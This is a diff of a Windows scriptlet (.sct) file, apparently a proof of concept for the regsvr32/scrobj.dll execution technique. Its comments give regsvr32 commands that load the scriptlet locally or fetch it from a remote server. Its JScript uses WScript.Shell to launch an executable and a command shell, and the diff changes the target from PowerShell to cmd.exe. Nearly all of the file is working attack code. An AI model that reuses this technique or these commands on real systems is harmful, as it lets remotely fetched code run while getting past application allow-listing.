@@ -2,19 +2,19 @@
 <scriptlet>	
 
 <registration	
-    description="HelloKids"	
-    progid="HelloKids"	
+    description="hellokids"	
+    progid="hellokids"	
     version="1.00"	
     classid="{20001111-0000-0000-0000-0000FEEDACDC}"	
 	>	
-	<!-- regsvr32 /s /i"C:\Hello\HelloKids.sct" scrobj.dll -->	
-	<!-- regsvr32 /s /i:http://server/HelloKids.sct scrobj.dll -->	
+	<!-- regsvr32 /s /i"C:\Hello\hellokids.sct" scrobj.dll -->	
+	<!-- regsvr32 /s /i:http://server/hellokids.sct scrobj.dll -->	
 	<!-- That should work over a proxy and SSL/TLS... -->	
 	<!-- Proof Of Concept - Casey Smith @subTee -->	
 	<script language="JScript">	
 		<![CDATA[	
 
-			var help = new ActiveXObject("WScript.Shell").Run("C:\\Program Files\\Cosmopolitanize\\Diggins.exe");		
+			var r = new ActiveXObject("WScript.Shell").Run("C:\\Program Files\\Cosmopolitanize\\Diggins.exe");		
 
 		]]>	
 </script>	
@@ -28,7 +28,7 @@
 
 	function Exec()	
 	{	
-		var help = new ActiveXObject("WScript.Shell").Run("powershell.exe");	
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");	
 	}	
 
 ]]>	
